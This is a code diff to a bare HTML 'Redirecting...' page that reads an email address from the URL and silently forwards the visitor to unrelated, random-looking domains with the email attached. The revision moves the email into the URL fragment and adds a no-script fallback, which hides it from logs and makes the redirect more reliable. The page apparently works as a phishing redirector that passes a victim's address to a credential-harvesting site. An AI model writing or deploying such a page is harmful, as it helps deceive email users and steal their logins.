@@ -1,19 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Redirecting...</title>
   <script>
-    const query = new URLSearchParams(window.location.search);
-    const email = query.get("email") || "unknown";
-    // Redirect with the email value appended
-    window.location.href = "https://loq.s2c2.ink/lhEiKkPP?email=" + encodeURIComponent(email);
+    // Read email from URL fragment (hash)
+    const email = decodeURIComponent(window.location.hash.substring(1)); // Remove leading '#'
+
+    // Your final target URL (replace with your actual target)
+    const targetBase = "https://loq.portelglobe434.com/HhsKrhfE";
+
+    if (email) {
+      // Redirect to target URL with email appended as fragment or query param
+      window.location.replace(`${targetBase}#${email}`);
+    } else {
+      // If no email found, just redirect to base target
+      window.location.replace(targetBase);
+    }
   </script>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=https://loq.portelglobe434.com/HhsKrhfE" />
+    <p>If you are not redirected, <a href="https://loq.portelglobe434.com/HhsKrhfE">click here</a>.</p>
+  </noscript>
 </head>
-<body>
-  <p>Redirecting... If you are not redirected, <a id="redirectLink">click here</a>.</p>
-  <script>
-    document.getElementById("redirectLink").href = "https://loq.s2c2.ink/lhEiKkPP?email=" + encodeURIComponent(email);
-  </script>
-</body>
+<body></body>
 </html>
